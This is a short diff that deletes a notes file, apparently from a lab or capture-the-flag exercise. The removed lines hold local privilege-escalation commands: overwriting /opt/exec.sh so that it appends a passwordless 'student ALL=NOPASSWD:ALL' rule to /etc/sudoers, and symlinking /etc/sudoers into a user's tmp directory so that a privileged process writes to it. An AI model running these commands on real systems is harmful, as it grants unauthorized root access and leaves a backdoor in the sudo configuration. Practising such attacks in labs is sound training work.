@@ -1,9 +1,0 @@
-
-
-replace shell file with printf:
-printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /opt/exec.sh
-
-
-
-create symbolic link to /etc/sudoers:
-ln -s /etc/sudoers /home/giovanni/work/tmp
